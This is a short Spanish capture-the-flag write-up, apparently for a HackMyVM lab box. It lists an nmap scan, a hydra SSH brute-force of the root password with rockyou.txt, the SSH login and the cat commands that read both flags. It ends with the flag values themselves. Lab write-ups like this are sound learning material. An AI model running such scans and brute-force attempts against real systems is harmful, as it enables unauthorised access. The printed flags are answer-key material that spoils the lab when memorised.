
```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.0.2.24 -oN escaneo
hydra -t 64 -I -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.24
ssh 10.0.2.24
```
Realizamos un escaner de nmap en el que encontramos los puertos 22 y 80 abiertos.
![[Pasted image 20240310010646.png]]
Entramos primero en la pagina web y nos encontramos lo siguiente en su codigo fuente.
![[Pasted image 20240310010807.png]]
Este texto  nos da a pensear que no es por aquí la intrusión así que intentamos un ataque de fuerza bruta contra el usuario root y nos encuentra su contraseña que es simple.
![[Pasted image 20240310011226.png]]
Entramos por ssh y encontramos las dos flags en el directorio en el que entramos
```bash
ls
cat root.txt
cat user.txt
```
![[Pasted image 20240310011401.png]]
Flag de user: HMV665sXzDS
Flag de root: HMVtyr543FG